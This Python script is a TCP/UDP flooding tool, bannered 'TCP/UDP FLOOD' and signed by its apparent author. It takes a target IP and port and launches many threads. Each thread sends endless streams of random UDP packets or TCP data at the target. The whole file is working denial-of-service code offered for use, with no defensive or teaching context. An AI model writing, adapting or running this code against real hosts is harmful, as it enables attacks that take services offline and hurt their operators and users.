import argparse
import random
import socket
import threading

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())

print("--> C0de By Lee0n123 <--")
print("#-- TCP/UDP FLOOD --#")
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	data = random._urandom(2048)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(128)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th1 = threading.Thread(target = run)
		th1.start()
		th2 = threading.Thread(target = run)
		th2.start()
		th3 = threading.Thread(target = run)
		th3.start()
		th4 = threading.Thread(target = run)
		th4.start()
		th5 = threading.Thread(target = run)
		th5.start()
		th6 = threading.Thread(target = run)
		th6.start()
		th7 = threading.Thread(target = run)
		th7.start()
		th8 = threading.Thread(target = run)
		th8.start()
		th9 = threading.Thread(target = run)
		th9.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
